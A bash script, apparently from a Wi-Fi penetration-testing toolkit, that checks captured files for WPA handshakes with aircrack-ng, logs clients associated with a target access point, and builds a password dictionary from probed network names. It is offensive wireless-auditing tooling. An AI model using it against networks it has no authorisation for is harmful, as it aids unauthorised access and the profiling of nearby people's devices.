#!/bin/bash
#
# #--------------------------------------------------------------------------------------------------------------------#
#
#
# Copyright (C) 2016  Musketteams
#
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# #--------------------------------------------------------------------------------------------------------------------#
#
# Disclaimer:   This script is intended for use only for private study or during an authorised pentest. The author bears no responsibility for malicious or illegal use.

# Once released to the community this work belongs to the community
# No Youtube downloads will ever be made by Musket Teams.
# 

# Note to MTeam field programmers
# DEAD DNA
# A aircrack-ng module is left in REM. Problem with time rqr to complete process caused REM
# This module not completly tested. The module runs aircrack-ng in xterm to find WPAkey
# However vagaries in time rqr to complete caused REM until a balance can be found.
# However solution doubtful. 
#
scan_fn()

{
tput sc
iw $DEV scan &>dev\null
echo -e "$warn            <- ^ ->$txtrst             "
echo -e "            S                   "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "           <-- ^ -->            "
echo -e "            Sc                  "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "          <--- ^ --->           "
echo -e "            Sca                 "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "         <---- ^ ---->          "
echo -e "            Scan                "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "        <----- ^ ----->         "
echo -e "            Scann               "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "       <------ ^ ------>        "
echo -e "            Scanni              "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "      <------- ^ ------->       "
echo -e "            Scannin             "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "     <-------- ^ -------->      "
echo -e "            Scanning            "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "    $warn<$txrst--------- ^ ---------$warn>$txtrst     "
echo -e "            Scanning            "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "     <-------- ^ -------->      "
echo -e "            Scannin             "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "      <------- ^ ------->       "
echo -e "            Scanni              "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "       <------ ^ ------>        "
echo -e "            Scann               "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "        <----- ^ ----->         "
echo -e "            Scan                "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "         <---- ^ ---->          "
echo -e "            Sca                 "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "          <--- ^ --->           "
echo -e "            Sc                  "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "           <-- ^ -->            "
echo -e "            S                   "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
sleep .1
tput rc
tput ed
echo -e "            <- ^ ->             "
echo -e "               *                "
echo -e "               |                "
echo -e "               |                "
echo -e "              |||               "
echo -e "              |||               "
echo -e "              |||               "
echo -e "  ---------------------------   "
tput rc
tput ed
}




ERRORCHKTEST=ZZZ

ERRORCHK_fn()
{

until  [ $ERRORCHKTEST == y ] || [ $ERRORCHKTEST == Y ]; do  

echo ""
echo ""
echo -e "$info$bold  $undr Error Handling Routines $txtrst"
echo -e ""
echo -e "$info     The script has embedded error handling routines to lessen the chance"
echo -e "$info  of input error. These checks can be turned off. It is suggest that until"
echo -e "$info  the user obtains some experience with the program that these checks be"
echo -e "$info  left in place."
  
echo -e "$inp     Enter$yel (y/Y)$inp to use these error handling checks." 
echo -e "$inp     Enter$yel (n/N)$inp to not use these features.$txtrst"
echo -e "$yel       !!!$warn Entering$yel (n/N)$warn for new users is NOT RECOMMENDED$yel !!!$txtrst"

	read ERRORCHK

	while true
	do

   echo ""
   echo -e  "$inp      You entered$yel $ERRORCHK$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
read ERRORCHKTEST

	case $ERRORCHKTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done


}





AIRO_WPS_fn()
{

# Test for airodump-ng --wps support for aircrack-ng installs in 1.1 2.0 etc
# If wpsavail=--wps then supported
# MTeams Progammers Note when grep airodump-ng output sometime spaces must be added.
# See -- wps variable with grep below. Cannot grep --wps!!!
# See also removing 001B from airodump-ng text output in Dead DNA module.
 
wpsavail=$(airodump-ng --help | grep -- wps | awk '{print $1}')

}

AIRO_WPS_fn

IFCONFIG_TYPE_fn()
{
# Note text output of ifconfig in kali2016 rolling has been altered
# Any routines requiring the use of text output must be altered
# Routine tests ifconfig process ouput 
# Written as fn for portability into other MTeam prog.

iftype=$(ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 == "ether") || (substr($1,length($1),1) == ":")) {print "ether";exit;}}')

	if [[ $iftype == "ether" ]]; then

		ifselect=new

	else

		ifselect=old

		fi

}

WPA_CAP_fn()

{

shakstat=0

aircrack-ng /tmp/HANDTEST/"$bssid-01.cap"  | cat > /tmp/HANDTEST/"aircrack.txt"

sleep 1

#xargs remove trailing white space

	if [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]] ; then

WPAZERO=$(cat < /tmp/HANDTEST/"aircrack.txt" | grep WPA | awk -F "WPA" '/WPA/ {print $2}' | xargs)

		fi

# For 1.1

	if [[ $KALI_TYPE == 1 ]]; then

WPAZERO=$(cat < /tmp/HANDTEST/"aircrack.txt" | grep WPA | awk -F "WPA" '/WPA/ {print $2}' | xargs)

#WPAZERO=$( echo $WPAZERO | awk '{print $2}' | xargs)

		fi

#Working
#WPAZERO=$(cat < /tmp/HANDTEST/"aircrack.txt" | sed 's/\x1b//g' | sed 's/11B//g' | grep WPA | awk -F "WPA" '/WPA/ {print $2}' | xargs)
#cat /tmp/HANDTEST/aircracktest.txt | sed 's/\x1b//g' | sed 's/11B//g' > /tmp/HANDTEST/aircracktest1.txt

#leaves whitespace remove wih xargs
#echo "WPAZERO=$WPAZERO"
#echo "length WPAZERO= ${#WPAZERO}"

sleep 1

if [[ "$WPAZERO" = "(1 handshake)" ]] && [[ $KALI_TYPE == 2 || $KALI_TYPE == 3 ]]; then

#	echo " debug $WPAZERO"
	echo "[+] Handshake found for $ssid"
	shakstat=1	

#	else

#	echo " debug $WPAZERO"
#	echo " [+] No Handshake FOUND for $ssid"
#	echo "[+] Handshakes found =$WPAZERO"
#	shakstat=0
	#Debug
	#shakstat=0
	#Debug

	elif [[ "$WPAZERO" = "(1 handshake)" ]] && [[ $KALI_TYPE == 1 ]]; then

#	echo " debug $WPAZERO"
	echo "[+] Handshake found for $ssid"
	shakstat=1	

	else

#	echo " debug $WPAZERO"
	echo "[+] No Handshake FOUND for $ssid"
#	echo "[+] Handshakes found =$WPAZERO"
	shakstat=0
	#Debug
	#shakstat=0
	#Debug

		fi

}


#~~~~~~~~~~~~~~~Start Find Client Associated Start~~~~~~~~~~~~~~~#

ASSOC_CLIENT_fn()

{

if [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+]"
sleep 1
echo -e "$txtrst[+] ************Standby************"
sleep 1
echo -e "$txtrst[+] Looking for associated clients."
sleep 1
echo -e "$txtrst[+]"
sleep 1

if [ ! -d "VARMAC_AIRCRACK" ]; then

    mkdir -p -m 700 VARMAC_AIRCRACK;

	fi

if [ -f  /tmp/HANDTEST/$bssid-01.csv ]; then

# Commentary sed 's/,//g' remove commas
# Easy way to handle irregular line end run thru dos2unix
# Leave only lines with Possible data

cat < /tmp/HANDTEST/$bssid-01.csv  | sed 's/,//g' | awk -F' ' '{print $1" "$7" "$8}' > /tmp/HANDTEST/$bssid-01.txt

sleep .5

#Remove commas

cat < /tmp/HANDTEST/$bssid-01.txt | awk -F"," '/1/ {print $1 $2 $3  }' > /tmp/HANDTEST/$bssid-02.txt

sleep .5

#Strip down to three(3) entries 

cat < /tmp/HANDTEST/$bssid-02.txt | dos2unix | tr [a-f] [A-F]  | awk -F' ' '{ if((length($3) == 17 )) {print $1" " $2 " " $3 }}' > /tmp/HANDTEST/$bssid-03.txt

sleep .5

#Remove the mon0 ie data produced by self from the list

#Move to uppercase to match aircrack-ng text output

MACRMV="$VARMAC"

MACRMV=$(echo $MACRMV | awk '{print toupper($0)}')

#To uppercase
#bssid=$(echo $bssid | tr [a-f] [A-F])

cat < /tmp/HANDTEST/$bssid-03.txt | dos2unix | awk -v mon=$MACRMV -F' ' '{ if($1 != mon ) {print $0}}' > /tmp/HANDTEST/$bssid-04.txt

sleep .5

#Remove all but target

cat < /tmp/HANDTEST/$bssid-04.txt | dos2unix | awk -v targetap=$bssid -F' ' '{ if($3 == targetap) {print $0}}' > /tmp/HANDTEST/$bssid-05.txt

sleep .5

#Print file with just data value could remove if statement

#Find highest value

cat < /tmp/HANDTEST/$bssid-05.txt | dos2unix | awk -v targetap=$bssid -F' ' '{ if($3 == targetap) {print $2}}' > /tmp/HANDTEST/$bssid-06.txt

sleep .5

#### Start Working ###

#### Build History of associated macs####

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /root/VARMAC_AIRCRACK/$bssid-client.txt

	fi

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /tmp/$bssid-client.txt

	fi

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06.txt)

sleep .5

CLIASO_MAX=$(cat < /tmp/HANDTEST/$bssid-05.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

sleep .5

cat < /tmp/HANDTEST/$bssid-05.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) { print $0 }}' > /tmp/HANDTEST/$bssid-05a.txt

sleep .5

#Find middle value of top three

cat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/HANDTEST/$bssid-06a.txt

sleep .5

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06a.txt)

sleep .5

CLIASO_MID=$(cat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

sleep .5

cat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $0}}' > /tmp/HANDTEST/$bssid-05b.txt

sleep .5

cat < /tmp/HANDTEST/$bssid-05b.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/HANDTEST/$bssid-06b.txt

sleep .5

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06b.txt)

sleep .5

CLIASO_LOW=$(cat < /tmp/HANDTEST/$bssid-05b.txt | dos2unix | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

#Write variables for historical record

	if [ ! -z $CLIASO_MAX ]; then

		echo "$CLIASO_MAX" >> /tmp/$bssid-client.txt

			fi

	if [ ! -z $CLIASO_MID ]; then

		echo "$CLIASO_MID" >> /tmp/$bssid-client.txt

			fi

	if [ ! -z $CLIASO_LOW ]; then

		echo "$CLIASO_LOW" >> /tmp/$bssid-client.txt

			fi

cat < /root/VARMAC_AIRCRACK/$bssid-client.txt >> /tmp/$bssid-client.txt

rm -f /root/VARMAC_AIRCRACK/$bssid-client.txt

cat < /tmp/$bssid-client.txt | sort -u > /root/VARMAC_AIRCRACK/$bssid-client.txt

rm -f /tmp/$bssid-client.txt

######

echo -e "$txtrst[+]$info Clients that have been seen associated to $bssid see:$txtrst"
sleep 1
echo -e  "[+]"
sleep 1
echo -e "$txtrst[+]   root/VARMAC_AIRCRACK/$bssid-client.txt"
sleep 1
echo -e  "[+]"
sleep 1
echo -e "$txtrst[+]$info Clients currently associated to $bssid $txtrst"
sleep 1
echo -e "$txtrst[+]$info arranged by order of activity are listed below:"
sleep 1
echo -e "$txtrst[+]"
sleep 1
#check var not null

if [[ ! -z $CLIASO_MAX ]]; then
	
	echo -e "$txtst[+] $CLIASO_MAX"

	else
	sleep 1
#	echo -e "$txtrst[+]"
	echo -e "$txtrst[+] No clients are currently associated to $bssid"
#	echo -e "$txtrst[+]"

		fi

if [[ ! -z $CLIASO_MID ]]; then
	sleep 1
	echo -e "$txtst[+] $CLIASO_MID"

		fi

if [[ ! -z $CLIASO_LOW ]]; then
	sleep 1
	echo -e "$txtst[+] $CLIASO_LOW"

		fi

	fi

		fi # Linked to[[ $shakstat == 0 ]]; then

}

#~~~~~~~~~~~~~~Start ESSIDPROBE_fn Start~~~~~~~~~~~~~~# 

ESSIDPROBE_fn()

{

# Copy files from folder used by handshake harvest

rm -f /tmp/ESSIDPROBE_DIR/*.kismet.csv

if [ ! -f  "/tmp/ESSIDPROBE_DIR/allcsv.txt" ]; then

	touch /tmp/ESSIDPROBE_DIR/allcsv.txt

	fi

#countcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`

#echo " 315 debug /root/*.csv $countcsv1"

#	if [[ $countcsv1 != 0 ]] && [[ $countcsv1 != $countcsv ]]; then

#		cat /root/*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt

#			fi


countcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`

#	echo " 324 debug /tmp/ESSIDPROBE_DIR/*.csv $countcsv1"

if [[ $countcsv1 != 0 ]]; then

cat /tmp/ESSIDPROBE_DIR/*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt

sleep 1

rm -f /tmp/ESSIDPROBE_DIR/*.csv


#debug
countcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/allcsv.txt 2>/dev/null | wc -l`

#echo " 335 debug /tmp/ESSIDPROBE_DIR/allcsv.txt $countcsv1"

	fi

sleep .1
#######################################################

# Sed commentary for MTeam prog
#sed 's/^[ \t]*//;s/[ \t]*$//' = Remove begin and end
#sed 's/.$//' = Convert to unix
#sed '/^$/d' remove blank lines
#sed 's/,/ /g' replace comma wih space

if [[ $KALI_TYPE == 1 ]]; then

cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk -F' ' '{ if((length($8) == 18 )) {$1=$2=$3=$4=$5=$6=$7=$8=""; print $0 }}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt

		fi

if [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]] ; then

cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $0 }}' | sed 's/.$//;s/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt

		fi

sleep .2

#Field 1
echo "[+] Writing ESSID probes Field 1"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 }' > /tmp/ESSIDPROBE_DIR/holdfield01a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 " " $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 " " $2 " " $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01e.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 " " $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01f.txt

#Field 2
echo "[+] Writing ESSID probes Field 2"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 }' > /tmp/ESSIDPROBE_DIR/holdfield02a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield02b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 " " $3 " " $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02e.txt

#Field 3
echo "[+] Writing ESSID probes Field 3"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 }' > /tmp/ESSIDPROBE_DIR/holdfield03a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 " " $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 " " $4 " " $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03e.txt

#Field 4
echo "[+] Writing ESSID probes Field 4"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 }' > /tmp/ESSIDPROBE_DIR/holdfield04a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 " " $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 " " $5 " " $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04e.txt

#Field 5
echo "[+] Writing ESSID probes Field 5"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 }' > /tmp/ESSIDPROBE_DIR/holdfield05a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 " " $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 " " $6 " " $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05e.txt

#Field 6
echo "[+] Writing ESSID probes Field 6"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 }' > /tmp/ESSIDPROBE_DIR/holdfield06a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 " " $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 " " $7 " " $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06e.txt

#Field 7
echo "[+] Writing ESSID probes Field 7"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 }' > /tmp/ESSIDPROBE_DIR/holdfield07a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 " " $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 " " $8 " " $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07e.txt

#Field 8
echo "[+] Writing ESSID probes Field 8"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 }' > /tmp/ESSIDPROBE_DIR/holdfield08a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 " " $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 " " $9 " " $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08e.txt

#Field 9
echo "[+] Writing ESSID probes Field 9"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 }' > /tmp/ESSIDPROBE_DIR/holdfield09a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 " " $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 " " $10 " " $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09e.txt

#Field 10
echo "[+] Writing ESSID probes Field 10"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 }' > /tmp/ESSIDPROBE_DIR/holdfield10a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 " " $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 " " $11 " " $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10e.txt

cat /tmp/ESSIDPROBE_DIR/holdfield*.txt >> /tmp/ESSIDPROBE_DIR/holdall16.txt

rm -f /tmp/ESSIDPROBE_DIR/holdfield*.txt

sleep 2

# Removes white spaces from left, limits length, sorts and removes duplicates

cat /tmp/ESSIDPROBE_DIR/holdall16.txt | sed 's/,/ /g' | sed 's/^[ \t]*//;s/[ \t]*$//' | awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt

echo "[+] Sorting essidprobesdic.txt"
sleep .2

cat /root/PROBEESSID_DATA/essidprobesdic.txt  > /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt

sleep .2

rm -f /root/PROBEESSID_DATA/essidprobesdic.txt

cat  /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt > /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt

sleep .2

# shorter strings

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt | sed 's/^[ \t]*//;s/[ \t]*$//' | awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt

sleep .2

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt

sleep .2

cp -f /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt /root/PROBEESSID_DATA/essidprobesdic.txt

echo "[+] Transfering essidprobesdic.txt to /root/PROBEESSID_DATA/"

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $1 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05a.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $2 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05b.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $3 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05c.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $4 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05d.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $5 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05e.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $6 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05f.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $7 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05g.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $8 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05h.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $9 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05i.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $10 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05j.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold-05*.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold05.txt

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt | sed s'/,/ /'g | sed 's/     / /g' | sed 's/    / /g' | sed 's/   / /g' | sed 's/  / /g' | sed 's/ / /g' > /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt

